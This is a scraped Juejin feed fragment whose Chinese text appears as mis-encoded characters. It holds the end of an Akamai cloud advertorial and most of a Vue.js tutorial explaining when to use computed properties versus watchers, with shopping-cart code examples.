noreferrer">åˆ†å¸ƒå¼äº‘</a>åŒºåŸŸã€å¼€å‘è€…ä½“éªŒå’Œé›†æˆå®‰å…¨æ–¹é¢çš„å·¥ä½œï¼Œæ­£æ±‡èšäºä¸€ä¸ªå…±åŒç›®æ ‡ï¼šåˆ›å»ºä¸€ä¸ªé¢å‘æœªæ¥ã€è¾¹ç¼˜ä¼˜å…ˆçš„å¹³å°ã€‚</p>
<p>IDC çš„åˆ†æå¹¶æœªå¿½è§†æœªæ¥çš„æŒ‘æˆ˜â€”â€”æ‰©å¼ çš„èµ„æœ¬å¯†é›†åº¦ã€ä¸è¶…å¤§è§„æ¨¡æä¾›å•†çš„è®¤çŸ¥å·®è·ï¼Œä»¥åŠå¼•å¯¼ä¼ä¸šé‡‡ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-multicloud%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external12_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-multicloud?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external12_blogarticles242" ref="nofollow noopener noreferrer">å¤šäº‘</a>ç­–ç•¥çš„å¤æ‚æ€§ã€‚ä½†æ­£æ˜¯æˆ‘ä»¬å°†æŒ‘æˆ˜è½¬åŒ–ä¸ºå‚¬åŒ–å‰‚çš„å†å²ï¼Œè®©æ­¤åˆ»å¦‚æ­¤ä»¤äººå…´å¥‹ã€‚</p>
<p>æŠ¥å‘Šæ€»ç»“é“ï¼Œæœºé‡åœ¨äºâ€œè¾¹ç¼˜AI æ¨ç†ã€äº‘æˆæœ¬ä¼˜åŒ–å’Œç»Ÿä¸€çš„å¤šäº‘è¿è¥â€â€”â€”è¿™äº›é¢†åŸŸéƒ½ä¸æˆ‘ä»¬çš„åˆ†å¸ƒå¼æ¶æ„å¤©ç„¶å¥‘åˆã€‚</p>
<p>æˆ‘ä»¬å®Œæˆäº†ä¸€ä¸ªå¾ªç¯ï¼šä»è§£å†³â€œå…¨çƒç­‰å¾…â€é—®é¢˜ï¼Œåˆ°å¸®åŠ©ä¸–ç•Œåº”å¯¹â€œAIæ— å¤„ä¸åœ¨â€çš„æŒ‘æˆ˜ã€‚æ­£å¦‚ä»å‰ä¸€æ ·ï¼Œè§£å†³æ–¹æ¡ˆå§‹äºæ›´é è¿‘ç”¨æˆ·ã€‚</p>
<p><strong><strong>äº†è§£æ›´å¤š</strong></strong></p>
<p>é˜…è¯»å®Œæ•´çš„IDC ä¾›åº”å•†æŠ¥å‘Šã€ŠAkamaiï¼šé©°éª‹äº‘ç–†ç•Œã€‹ï¼Œæ¢ç´¢Akamai çš„åˆ†å¸ƒå¼äº‘å¦‚ä½•ä¸ºä¸‹ä¸€ä»£AI åº”ç”¨å¡‘é€ åŸºç¡€è®¾æ–½åŸºçŸ³ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue ä¸­ computed å’Œ watch çš„æ·±åº¦è§£æï¼šåˆ«å†ç”¨é”™äº†ï¼]]></title>    <link>https://juejin.cn/post/7595041883145060398</link>    <guid>https://juejin.cn/post/7595041883145060398</guid>    <pubDate>2026-01-14T13:23:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595041883145060398" data-draft-id="7595041883145044014" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue ä¸­ computed å’Œ watch çš„æ·±åº¦è§£æï¼šåˆ«å†ç”¨é”™äº†ï¼"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T13:23:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue ä¸­ computed å’Œ watch çš„æ·±åº¦è§£æï¼šåˆ«å†ç”¨é”™äº†ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T13:23:36.000Z" title="Wed Jan 14 2026 13:23:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼ä»Šå¤©æˆ‘ä»¬æ¥èŠèŠ Vue.js ä¸­ä¸¤ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼š<strong>computed</strong>Â å’ŒÂ <strong>watch</strong>ã€‚å¾ˆå¤š Vue åˆå­¦è€…ç”šè‡³æœ‰ä¸€å®šç»éªŒçš„å¼€å‘è€…ï¼Œå¯¹è¿™ä¸¤ä¸ªåŠŸèƒ½çš„ä½¿ç”¨åœºæ™¯å’ŒåŒºåˆ«ä»ç„¶å­˜åœ¨å›°æƒ‘ã€‚</p>
<p>â€œä»€ä¹ˆæ—¶å€™ç”¨ computedï¼Ÿä»€ä¹ˆæ—¶å€™ç”¨ watchï¼Ÿâ€ è¿™å¯èƒ½æ˜¯ Vue å¼€å‘è€…æœ€å¸¸é‡åˆ°çš„é—®é¢˜ä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆçœ‹ä¸€ä¸ªçœŸå®åœºæ™¯</h2>
<p>å‡è®¾æˆ‘ä»¬æ­£åœ¨å¼€å‘ä¸€ä¸ªç”µå•†ç½‘ç«™ï¼Œéœ€è¦è®¡ç®—è´­ç‰©è½¦æ€»ä»·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â è´­ç‰©è½¦æ•°æ®</span>
<span class="hljs-title function_">data</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â <span class="hljs-attr">cartItems</span>:Â [
Â Â Â Â Â Â {Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'å•†å“A'</span>,Â <span class="hljs-attr">price</span>:Â <span class="hljs-number">100</span>,Â <span class="hljs-attr">quantity</span>:Â <span class="hljs-number">2</span>Â },
Â Â Â Â Â Â {Â <span class="hljs-attr">name</span>:Â <span class="hljs-string">'å•†å“B'</span>,Â <span class="hljs-attr">price</span>:Â <span class="hljs-number">200</span>,Â <span class="hljs-attr">quantity</span>:Â <span class="hljs-number">1</span>Â }
Â Â Â Â ],
Â Â Â Â <span class="hljs-attr">discount</span>:Â <span class="hljs-number">0.9</span>Â <span class="hljs-comment">//Â 9æŠ˜ä¼˜æƒ </span>
Â Â }
}
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬éœ€è¦è®¡ç®—ï¼š</p>
<ol>
<li>
<ol>
<li>å•†å“æ€»ä»·ï¼ˆå•ä»·Ã—æ•°é‡ä¹‹å’Œï¼‰</li>
</ol>
</li>
<li>
<ol start="2">
<li>æŠ˜åæ€»ä»·</li>
</ol>
</li>
</ol>
<p>è¯¥æ€ä¹ˆå®ç°å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">äºŒã€Computedï¼ˆè®¡ç®—å±æ€§ï¼‰ï¼šç”¨äºæ´¾ç”Ÿæ•°æ®</h2>
<p><strong>computed çš„æ ¸å¿ƒæ€æƒ³ï¼šåŸºäºç°æœ‰æ•°æ®è®¡ç®—å‡ºä¸€ä¸ªæ–°çš„æ•°æ®å€¼</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">computed</span>:Â {
Â Â <span class="hljs-comment">//Â è®¡ç®—å•†å“æ€»ä»·</span>
Â Â <span class="hljs-title function_">totalPrice</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">cartItems</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum,Â item</span>)Â =&gt;</span>Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â sumÂ +Â item.<span class="hljs-property">price</span>Â *Â item.<span class="hljs-property">quantity</span>
Â Â Â Â },Â <span class="hljs-number">0</span>)
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â è®¡ç®—æŠ˜åä»·</span>
Â Â <span class="hljs-title function_">finalPrice</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">totalPrice</span>Â *Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">discount</span>
Â Â }
}
</code></pre>
<p><strong>computed çš„ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li>1.Â <strong>å£°æ˜å¼ç¼–ç¨‹</strong>ï¼šä½ åªéœ€è¦å‘Šè¯‰ Vue "æˆ‘éœ€è¦ä»€ä¹ˆæ•°æ®"ï¼ŒVue ä¼šè‡ªåŠ¨å¤„ç†ä¾èµ–å’Œæ›´æ–°</li>
<li>2.Â <strong>ç¼“å­˜æœºåˆ¶</strong>ï¼šåªæœ‰å½“ä¾èµ–çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰ä¼šé‡æ–°è®¡ç®—</li>
<li>3.Â <strong>åŒæ­¥è®¡ç®—</strong>ï¼šé€‚åˆæ‰§è¡ŒåŒæ­¥æ“ä½œ</li>
<li>4.Â <strong>è¿”å›ä¸€ä¸ªæ–°å€¼</strong>ï¼šå¿…é¡»è¿”å›ä¸€ä¸ªå€¼</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€Watchï¼ˆä¾¦å¬å™¨ï¼‰ï¼šç”¨äºè§‚å¯Ÿæ•°æ®å˜åŒ–</h2>
<p><strong>watch çš„æ ¸å¿ƒæ€æƒ³ï¼šå½“æŸä¸ªæ•°æ®å˜åŒ–æ—¶ï¼Œæ‰§è¡Œç‰¹å®šçš„æ“ä½œ</strong></p>
<p>å‡è®¾æˆ‘ä»¬å¸Œæœ›åœ¨è´­ç‰©è½¦å•†å“å˜åŒ–æ—¶ï¼Œè‡ªåŠ¨ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">watch</span>:Â {
Â Â <span class="hljs-comment">//Â æ·±åº¦ç›‘å¬è´­ç‰©è½¦å˜åŒ–</span>
Â Â <span class="hljs-attr">cartItems</span>:Â {
Â Â Â Â <span class="hljs-title function_">handler</span>(<span class="hljs-params">newVal,Â oldVal</span>)Â {
Â Â Â Â Â Â <span class="hljs-comment">//Â ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨</span>
Â Â Â Â Â Â <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'cart'</span>,Â <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(newVal))
Â Â Â Â Â Â <span class="hljs-comment">//Â å¯ä»¥å‘é€åˆ°æœåŠ¡å™¨</span>
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveCartToServer</span>(newVal)
Â Â Â Â },
Â Â Â Â <span class="hljs-attr">deep</span>:Â <span class="hljs-literal">true</span>,Â <span class="hljs-comment">//Â æ·±åº¦ç›‘å¬</span>
Â Â Â Â <span class="hljs-attr">immediate</span>:Â <span class="hljs-literal">true</span>Â <span class="hljs-comment">//Â ç«‹å³æ‰§è¡Œä¸€æ¬¡</span>
Â Â },
Â Â 
Â Â <span class="hljs-comment">//Â ç›‘å¬æ€»ä»·å˜åŒ–</span>
Â Â <span class="hljs-title function_">totalPrice</span>(<span class="hljs-params">newPrice</span>)Â {
Â Â Â Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ€»ä»·å˜ä¸ºï¼š<span class="hljs-subst">${newPrice}</span>`</span>)
Â Â Â Â <span class="hljs-keyword">if</span>Â (newPriceÂ &gt;Â <span class="hljs-number">1000</span>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showDiscountTip</span>()Â <span class="hljs-comment">//Â æ˜¾ç¤ºä¼˜æƒ æç¤º</span>
Â Â Â Â }
Â Â }
}
</code></pre>
<p><strong>watch çš„ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li>1.Â <strong>å‘½ä»¤å¼ç¼–ç¨‹</strong>ï¼šä½ å‘Šè¯‰ Vue "å½“è¿™ä¸ªæ•°æ®å˜åŒ–æ—¶ï¼Œæ‰§è¡Œè¿™äº›ä»£ç "</li>
<li>2.Â <strong>æ— ç¼“å­˜</strong>ï¼šæ¯æ¬¡å˜åŒ–éƒ½ä¼šæ‰§è¡Œ</li>
<li>3.Â <strong>å¯ä»¥æ‰§è¡Œå¼‚æ­¥æ“ä½œ</strong>ï¼šé€‚åˆ API è°ƒç”¨ã€å¤æ‚ä¸šåŠ¡é€»è¾‘</li>
<li>4.Â <strong>ä¸è¿”å›å€¼</strong>ï¼šä¸»è¦ç›®çš„æ˜¯æ‰§è¡Œå‰¯ä½œç”¨æ“ä½œ</li>
</ol>
<h2 data-id="heading-3">å››ã€æ ¸å¿ƒåŒºåˆ«å¯¹æ¯”è¡¨</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>computed</th><th>watch</th></tr></thead><tbody><tr><td><strong>ç›®çš„</strong></td><td>æ´¾ç”Ÿæ–°æ•°æ®</td><td>å“åº”æ•°æ®å˜åŒ–</td></tr><tr><td><strong>ç¼“å­˜</strong></td><td>âœ… æœ‰ç¼“å­˜</td><td>âŒ æ— ç¼“å­˜</td></tr><tr><td><strong>è¿”å›å€¼</strong></td><td>âœ… å¿…é¡»è¿”å›å€¼</td><td>âŒ ä¸è¿”å›å€¼</td></tr><tr><td><strong>å¼‚æ­¥</strong></td><td>âŒ ä¸æ”¯æŒå¼‚æ­¥</td><td>âœ… æ”¯æŒå¼‚æ­¥</td></tr><tr><td><strong>è¯­æ³•</strong></td><td>å‡½æ•°å½¢å¼</td><td>å¯¹è±¡æˆ–å‡½æ•°å½¢å¼</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>æ¨¡æ¿ä¸­çš„è®¡ç®—é€»è¾‘</td><td>æ•°æ®å˜åŒ–æ—¶çš„å‰¯ä½œç”¨</td></tr></tbody></table>
<h2 data-id="heading-4">äº”ã€ä»€ä¹ˆæ—¶å€™ç”¨ computedï¼Ÿä»€ä¹ˆæ—¶å€™ç”¨ watchï¼Ÿ</h2>
<h3 data-id="heading-5">ä½¿ç”¨ computed çš„åœºæ™¯ï¼š</h3>
<ol>
<li>
<p>1.Â <strong>æ¨¡æ¿ä¸­éœ€è¦å¤æ‚è¡¨è¾¾å¼æ—¶</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â ä¸æ¨èÂ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{Â cartItems.reduce((sum,Â item)Â =&gt;Â sumÂ +Â item.price,Â 0)Â }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-comment">&lt;!--Â æ¨èÂ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{Â totalPriceÂ }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
</li>
<li>
<p>2.Â <strong>ä¸€ä¸ªæ•°æ®ä¾èµ–å¤šä¸ªæ•°æ®æ—¶</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">computed:Â {
Â Â fullName()Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-keyword">this</span>.firstNameÂ +Â <span class="hljs-string">'Â '</span>Â +Â <span class="hljs-keyword">this</span>.lastName
Â Â }
}
</code></pre>
</li>
<li>
<p>3.Â <strong>éœ€è¦ç¼“å­˜ä¼˜åŒ–æ€§èƒ½æ—¶</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â å¤æ‚è®¡ç®—åªä¼šåœ¨ä¾èµ–å˜åŒ–æ—¶æ‰§è¡Œ</span>
<span class="hljs-attr">computed</span>:Â {
Â Â <span class="hljs-title function_">filteredList</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-comment">//Â å‡è®¾è¿™æ˜¯å¾ˆè€—æ—¶çš„ç­›é€‰æ“ä½œ</span>
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">hugeList</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span>Â =&gt;</span>Â item.<span class="hljs-property">active</span>)
Â Â }
}
</code></pre>
</li>
</ol>
<h3 data-id="heading-6">ä½¿ç”¨ watch çš„åœºæ™¯ï¼š</h3>
<ol>
<li>
<p>1.Â <strong>æ•°æ®å˜åŒ–æ—¶éœ€è¦æ‰§è¡Œå¼‚æ­¥æ“ä½œ</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">watch</span>:Â {
Â Â <span class="hljs-title function_">searchQuery</span>(<span class="hljs-params">newQuery</span>)Â {
Â Â Â Â <span class="hljs-comment">//Â é˜²æŠ–æœç´¢</span>
Â Â Â Â <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>)
Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>Â =Â <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()Â =&gt;</span>Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">searchAPI</span>(newQuery)
Â Â Â Â },Â <span class="hljs-number">500</span>)
Â Â }
}
</code></pre>
</li>
<li>
<p>2.Â <strong>æ•°æ®å˜åŒ–æ—¶éœ€è¦æ‰§è¡Œå¤æ‚ä¸šåŠ¡é€»è¾‘</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">watch</span>:Â {
Â Â <span class="hljs-title function_">userLevel</span>(<span class="hljs-params">newLevel,Â oldLevel</span>)Â {
Â Â Â Â <span class="hljs-keyword">if</span>Â (newLevelÂ ===Â <span class="hljs-string">'vip'</span>Â &amp;&amp;Â oldLevelÂ !==Â <span class="hljs-string">'vip'</span>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showVIPWelcome</span>()
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendVIPNotification</span>()
Â Â Â Â }
Â Â }
}
</code></pre>
</li>
<li>
<p>3.Â <strong>éœ€è¦è§‚å¯Ÿå¯¹è±¡å†…éƒ¨å˜åŒ–æ—¶</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">watch</span>:Â {
Â Â <span class="hljs-attr">formData</span>:Â {
Â Â Â Â <span class="hljs-title function_">handler</span>(<span class="hljs-params"/>)Â {
Â Â Â Â Â Â <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateForm</span>()
Â Â Â Â },
Â Â Â Â <span class="hljs-attr">deep</span>:Â <span class="hljs-literal">true</span>
Â Â }
}
</code></pre>
</li>
</ol>
<h2 data-id="heading-7">å…­ã€å¸¸è§è¯¯åŒºå’Œæœ€ä½³å®è·µ</h2>
<h3 data-id="heading-8">è¯¯åŒº1ï¼šç”¨ watch å®ç°æœ¬è¯¥ç”¨ computed çš„åŠŸèƒ½</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â âŒÂ ä¸æ¨èï¼šç”¨Â watchÂ è®¡ç®—å…¨å</span>
<span class="hljs-keyword">data</span>()Â {
Â Â <span class="hljs-keyword">return</span>Â {
Â Â Â Â firstName:Â <span class="hljs-string">'å¼ '</span>,
Â Â Â Â lastName:Â <span class="hljs-string">'ä¸‰'</span>,
Â Â Â Â fullName:Â <span class="hljs-string">''</span>
Â Â }
},
watch:Â {
Â Â firstName()Â {
Â Â Â Â <span class="hljs-keyword">this</span>.fullNameÂ =Â <span class="hljs-keyword">this</span>.firstNameÂ +Â <span class="hljs-keyword">this</span>.lastName
Â Â },
Â Â lastName()Â {
Â Â Â Â <span class="hljs-keyword">this</span>.fullNameÂ =Â <span class="hljs-keyword">this</span>.firstNameÂ +Â <span class="hljs-keyword">this</span>.lastName
Â Â }
}

<span class="hljs-comment">//Â âœ…Â æ¨èï¼šç”¨Â computedÂ è®¡ç®—å…¨å</span>
computed:Â {
Â Â fullName()Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-keyword">this</span>.firstNameÂ +Â <span class="hljs-string">'Â '</span>Â +Â <span class="hljs-keyword">this</span>.lastName
Â Â }
}
</code></pre>
<h3 data-id="heading-9">è¯¯åŒº2ï¼šåœ¨ computed ä¸­æ‰§è¡Œå‰¯ä½œç”¨æ“ä½œ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â âŒÂ ä¸æ¨èï¼šåœ¨Â computedÂ ä¸­ä¿®æ”¹æ•°æ®</span>
computed:Â {
Â Â processedData()Â {
Â Â Â Â <span class="hljs-comment">//Â ä¸è¦è¿™æ ·åšï¼</span>
Â Â Â Â <span class="hljs-keyword">this</span>.someOtherDataÂ =Â <span class="hljs-string">'changed'</span>
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-keyword">this</span>.<span class="hljs-keyword">data</span>.map(itemÂ =&gt;Â itemÂ *Â <span class="hljs-number">2</span>)
Â Â }
}

<span class="hljs-comment">//Â âœ…Â æ¨èï¼šç”¨Â watchÂ æ‰§è¡Œå‰¯ä½œç”¨</span>
watch:Â {
Â Â <span class="hljs-keyword">data</span>(newData)Â {
Â Â Â Â <span class="hljs-keyword">this</span>.someOtherDataÂ =Â <span class="hljs-string">'changed'</span>
Â Â }
}
</code></pre>
<h2 data-id="heading-10">ä¸ƒã€æ€§èƒ½è€ƒé‡</h2>
<p><strong>computed çš„ç¼“å­˜æœºåˆ¶</strong>æ˜¯ Vue æ€§èƒ½ä¼˜åŒ–çš„é‡è¦æ‰‹æ®µï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">computed</span>:Â {
Â Â <span class="hljs-comment">//Â å‡è®¾è¿™æ˜¯ä¸€ä¸ªè®¡ç®—é‡å¾ˆå¤§çš„å‡½æ•°</span>
Â Â <span class="hljs-title function_">expensiveCalculation</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é‡æ–°è®¡ç®—ï¼'</span>)
Â Â Â Â <span class="hljs-comment">//Â å¤æ‚è®¡ç®—...</span>
Â Â Â Â <span class="hljs-keyword">return</span>Â result
Â Â }
}
</code></pre>
<p>åœ¨æ¨¡æ¿ä¸­å¤šæ¬¡ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span>&gt;{{Â expensiveCalculationÂ }}&lt;/<span class="hljs-selector-tag">div</span>&gt;
&lt;<span class="hljs-selector-tag">div</span>&gt;{{Â expensiveCalculationÂ }}&lt;/<span class="hljs-selector-tag">div</span>&gt;
&lt;<span class="hljs-selector-tag">div</span>&gt;{{Â expensiveCalculationÂ }}&lt;/<span class="hljs-selector-tag">div</span>&gt;
